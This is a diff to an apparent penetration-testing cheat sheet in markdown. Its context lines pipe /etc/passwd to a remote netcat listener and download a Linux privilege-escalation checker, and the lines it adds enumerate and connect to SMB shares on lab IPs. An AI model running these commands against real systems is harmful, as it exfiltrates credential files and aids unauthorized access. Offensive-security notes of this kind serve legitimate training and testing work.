@@ -43,3 +43,9 @@ Remote Listener: `cat /etc/passwd | netcat 10.37.129.4 2222`
 $ wget https://raw.githubusercontent.com/t04glovern/icu/master/tools/linuxprivchecker.py
 $ python linuxprivchecker.py > linux_priv_check.txt
 ```
+
+##### smbclient scan
+`smbclient -L 10.37.129.11`
+
+##### smbclient connect
+`smbclient '\\10.37.129.11\<sharename>'
